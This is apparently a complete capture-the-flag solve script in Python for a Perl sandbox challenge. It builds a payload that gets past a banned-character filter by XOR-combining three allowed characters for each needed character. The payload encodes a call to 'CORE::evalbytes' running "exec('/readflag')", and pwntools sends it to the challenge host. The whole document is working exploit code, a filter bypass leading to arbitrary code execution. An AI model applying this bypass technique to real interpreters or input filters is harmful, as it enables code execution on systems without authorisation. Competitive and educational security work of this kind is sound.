# part 1: generate payload

from itertools import combinations
from collections import defaultdict
import string

# adding some chars to the not_valid list that are technically not banned... they're just annoying to deal with
not_valid = string.ascii_letters + "\"`$%@" + "<> &*\\{}[]'"
valid = "".join([chr(x) for x in range(0x20, 0x7f) if chr(x) not in not_valid])

results = defaultdict(list)

for (a, b, c) in combinations(valid, 3):
    r = ord(a) ^ ord(b) ^ ord(c)
    results[chr(r)].append((a,b,c))
    
def gen_payload(payload):
    global results
    parts = [[], [], []]
    for c in payload:
        for i, part in enumerate(results[c][0]):
            parts[i].append(part)
            
    return "^".join(map(lambda part: "<"+"".join(part)+">", parts))

# generating:
# *{"CORE::evalbytes"}->("exec('/readflag')")  
func = "CORE::evalbytes"
cmd = "exec('/readflag')"

payload = f"*{{{gen_payload(func)}}}->({gen_payload(cmd)})"
print(f"{payload = !s}")

# part 2: send to remote
from pwn import remote

p = remote("silly-camel.challs.csc.tf", 1337)

p.sendlineafter(b"> ", payload.encode())
p.interactive()